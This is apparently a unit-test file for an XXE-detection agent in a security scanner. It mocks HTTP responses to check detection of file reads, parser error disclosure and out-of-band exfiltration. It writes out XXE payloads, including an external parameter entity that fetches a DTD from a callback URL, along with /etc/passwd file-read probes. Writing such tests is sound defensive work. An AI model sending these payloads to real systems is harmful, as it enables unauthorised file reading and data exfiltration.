"""
Unit tests for XxeAgent — XML External Entity injection (file read, OOB
exfiltration, parser error disclosure). HTTP layer mocked via
dast.agents.xxe_agent._send.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from dast.agents.xxe_agent import XxeAgent
from dast.scanners.active_checks import CheckTarget


def _target(url="https://example.com/api/upload", method="POST", body=None, content_type="application/xml"):
    return CheckTarget(
        method=method,
        url=url,
        headers={"content-type": content_type},
        body=body or '<?xml version="1.0"?><root><name>test</name></root>',
        params=[],
    )


def _resp(status=200, text=""):
    m = MagicMock()
    m.status_code = status
    m.text = text
    return m


class _FakeCollaborator:
    """Fake OOB listener matching the REAL CollaboratorService API (host/port +
    issue_token + SYNC was_hit with sub-path prefix matching). The previous fake
    exposed `url` + `async poll()` — precisely the nonexistent API the production
    bug called — which is how the AttributeError survived its suite."""

    def __init__(self, hit_tokens=None):
        self._hit_tokens = set(hit_tokens or [])
        self.host = "127.0.0.1"
        self.port = 9999
        self._issued: list = []

    def issue_token(self):
        token = f"dast{900000 + len(self._issued)}"
        self._issued.append(token)
        return token

    def was_hit(self, token):
        if token in self._hit_tokens:
            return True
        # Mirror the real sub-path semantics (CALLBACK_URL/xxe.dtd counts).
        return any(h.startswith(f"{token}/") for h in self._hit_tokens)

    def register_callback(self, token, path_suffix=""):
        """Simulate the target's parser fetching a resource under the token."""
        self._hit_tokens.add(f"{token}/{path_suffix}" if path_suffix else token)


# ── positive: inline file read ───────────────────────────────────────────────

@pytest.mark.asyncio
async def test_inline_file_read_detected():
    target = _target()

    async def fake_send(client, method, url, headers, body, payload=None):
        if body and "file:///etc/passwd" in body:
            return _resp(200, "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:")
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert len(findings) == 1
    assert findings[0].attack_type == "xxe"
    assert findings[0].cwe == "CWE-611"
    assert "Arbitrary File Read" in findings[0].title
    assert findings[0].bypass_validation is True


# ── positive: parser error discloses XXE processing ─────────────────────────

@pytest.mark.asyncio
async def test_parser_error_disclosure_detected():
    target = _target()

    async def fake_send(client, method, url, headers, body, payload=None):
        return _resp(500, "org.xml.sax.SAXParseException: DTD is disallowed")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert len(findings) >= 1
    assert any("Parser Error Disclosure" in f.title for f in findings)


# ── positive: OOB exfiltration via collaborator ──────────────────────────────

@pytest.mark.asyncio
async def test_oob_exfiltration_confirmed_token_scoped(monkeypatch):
    """The parser fetches the DTD from a SUB-PATH of the callback URL
    (CALLBACK_URL/xxe.dtd); the token-scoped check must still confirm via the
    prefix match, and the evidence must cite the token."""
    import re

    target = _target()
    collaborator = _FakeCollaborator()

    monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
    monkeypatch.setattr(
        "dast.agents.xxe_agent.get_payloads",
        lambda category, group: (
            ['<!DOCTYPE x [<!ENTITY % xxe SYSTEM "CALLBACK_URL/xxe.dtd"> %xxe;]>'] if group == "oob_dtd" else []
        ),
    )

    async def fake_send(client, method, url, headers, body, payload=None):
        # Simulate the vulnerable parser: extract the token embedded in the payload
        # and fetch the DTD sub-path on the collaborator.
        m = re.search(r"http://127\.0\.0\.1:9999/(dast\d+)", body or "")
        if m:
            collaborator.register_callback(m.group(1), path_suffix="xxe.dtd")
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=collaborator)

    assert len(findings) == 1
    assert "Out-of-Band Exfiltration" in findings[0].title
    assert findings[0].confirmed is True
    assert findings[0].bypass_validation is True
    assert "dast900000" in findings[0].evidence  # the token is in the evidence


@pytest.mark.asyncio
async def test_oob_no_callback_no_finding(monkeypatch):
    """Tokens issued but never hit → no OOB finding (and no crash from the old
    nonexistent `poll()` API)."""
    target = _target()
    collaborator = _FakeCollaborator()  # no hits registered

    monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))
    monkeypatch.setattr(
        "dast.agents.xxe_agent.get_payloads",
        lambda category, group: (
            ['<!DOCTYPE x [<!ENTITY % xxe SYSTEM "CALLBACK_URL/xxe.dtd"> %xxe;]>'] if group == "oob_dtd" else []
        ),
    )

    async def fake_send(client, method, url, headers, body, payload=None):
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=collaborator)

    assert findings == []
    assert collaborator._issued  # payloads were actually sent with issued tokens


# ── regression: real payloads load and the collaborator URL is substituted ───
# Guards against the group-name / placeholder mismatch that silently disabled
# OOB XXE (agent asked for "oob_exfiltration"/"{{CALLBACK_URL}}" while the YAML
# defines "oob_dtd"/"CALLBACK_URL", so no OOB payload was ever sent).

@pytest.mark.asyncio
async def test_oob_real_payloads_substitute_callback_url(monkeypatch):
    import re

    target = _target()
    collaborator = _FakeCollaborator()
    monkeypatch.setattr("asyncio.sleep", AsyncMock(return_value=None))

    sent_bodies = []

    async def fake_send(client, method, url, headers, body, payload=None):
        sent_bodies.append(body or "")
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        await XxeAgent().run(target, MagicMock(), collaborator=collaborator)

    # At least one OOB payload from the real xxe.yaml must have been sent with
    # the placeholder replaced by a tokened collaborator URL — and none may
    # still carry the raw CALLBACK_URL token.
    assert any(re.search(r"http://127\.0\.0\.1:9999/dast\d+", body) for body in sent_bodies)
    assert not any("CALLBACK_URL" in body for body in sent_bodies)


# ── regression: inline parameter-entity payloads are exercised ────────────────

@pytest.mark.asyncio
async def test_parameter_entity_payloads_are_sent():
    target = _target()
    sent_bodies = []

    async def fake_send(client, method, url, headers, body, payload=None):
        sent_bodies.append(body or "")
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        await XxeAgent().run(target, MagicMock(), collaborator=None)

    # The XInclude variant is unique to the parameter_entity group, so seeing it
    # proves that group is now wired into the inline file-read phase.
    assert any("xi:include" in body.lower() for body in sent_bodies)


# ── negative: clean XML response, no collaborator ────────────────────────────

@pytest.mark.asyncio
async def test_clean_response_no_finding():
    target = _target()

    async def fake_send(client, method, url, headers, body, payload=None):
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert findings == []


# ── negative: GET endpoint that isn't XML is skipped ─────────────────────────

@pytest.mark.asyncio
async def test_non_xml_get_endpoint_skipped():
    target = _target(method="GET", content_type="application/json")

    findings = await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert findings == []


# ── content-type switch on non-XML POST endpoint ─────────────────────────────

@pytest.mark.asyncio
async def test_non_xml_post_endpoint_forces_xml_content_type():
    target = _target(content_type="application/json", body='{"name": "test"}')
    seen_headers = []

    async def fake_send(client, method, url, headers, body, payload=None):
        seen_headers.append(dict(headers))
        return _resp(200, "<root>ok</root>")

    with patch("dast.agents.xxe_agent._send", side_effect=fake_send):
        await XxeAgent().run(target, MagicMock(), collaborator=None)

    assert seen_headers
    assert seen_headers[0]["content-type"] == "application/xml"
    # Original target headers must never be mutated (shared across agents).
    assert target.headers["content-type"] == "application/json"
